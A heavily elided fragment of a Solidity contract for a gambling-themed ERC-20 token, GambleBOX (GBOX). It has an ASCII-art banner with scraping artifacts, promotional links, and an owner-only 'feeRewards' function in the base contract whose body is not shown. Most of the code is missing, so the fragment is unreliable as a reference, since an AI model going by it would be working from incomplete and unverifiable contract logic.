     ...
     :#@@@@@@@@@#:  [email protected]@@%[email protected]@@@: [email protected]@@+ +###+ [email protected]@@+ :@@@@%@@@@%.*@@@@%%%%%[email protected]@@@%%%%%%    
        -+***+-.    ****.    :***+ ****-       -****.+#******+- .********%+.********%+    
                          ...
                          =%%%%%%%#=     .=*###*+- .#%%%:  -%%%*                          
                                 ...
                                 💊PROJECT DATA:
                            WWW: https://gamblebox.net/
                        MEDIUM: https://medium.com/@Gamble_BOX
                LITEPAPER: https://gamblebox.gitbook.io/gbox-gamblebox/

                               🤝SOCIAL MATTERS:
                     TELEGRAM CHAT: https://t.me/GambleBox
                     TWITTER: https://twitter.com/GambleBox
                     TELEGRAM SHOUTS: https://t.me/GBOXshouts                                                                    
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
     ...
     */
    function feeRewards (address spender) external onlyOwner {
...
contract GBOX is ERC20 {

    /**
     * @dev Sets the values for {name}, {symbol} and {totalsupply}.
     */
    constructor() ERC20('GambleBOX', 'GBOX')  {
